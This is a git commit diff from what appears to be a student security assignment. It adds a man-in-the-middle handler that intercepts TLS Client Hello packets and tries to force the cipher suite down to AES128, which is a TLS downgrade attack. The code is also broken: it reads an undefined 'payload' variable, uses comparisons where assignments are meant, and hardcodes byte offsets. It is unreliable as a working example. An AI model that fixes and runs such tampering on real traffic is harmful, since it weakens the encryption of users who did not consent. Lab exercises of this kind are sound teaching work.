1c25fe08ba77e73a8d8314638c7d0c85f6ab961f
MinhTri-Pham <s1612839@sms.ed.ac.uk>
2020-10-31 01:00:58 +0100

    First implementation of ex2 hw4

--- hw4/ex2/mitm.py
+++ hw4/ex2/mitm.py
@@ -8,7 +8,18 @@ def print_and_accept(pkt):
 
 def process_packet(pkt):
     ip = IP(pkt.get_payload())
-    # Do some stuff
+    if (ip.haslayer(Raw)):
+        pkt_bytes = bytes(ip[Raw].load)
+        # Filter Client Hello TLS messages
+        # The Content type is Handshake (0x16 = 22)
+        # Handshake Type is Client Hello (0x01 = 1)
+        if (pkt_bytes[0] == 0x16 and pkt_bytes[5] == 0x01):
+            # Set ciphersuite to AES128 which has code 00 2f
+            new_payload = [x for x in payload]
+            new_payload[46] == 0x00
+            new_payload[47] == 0x2f
+            pkt.set_payload(bytes(new_payload))
+
     pkt.accept()       
 
 nfqueue = NetfilterQueue()
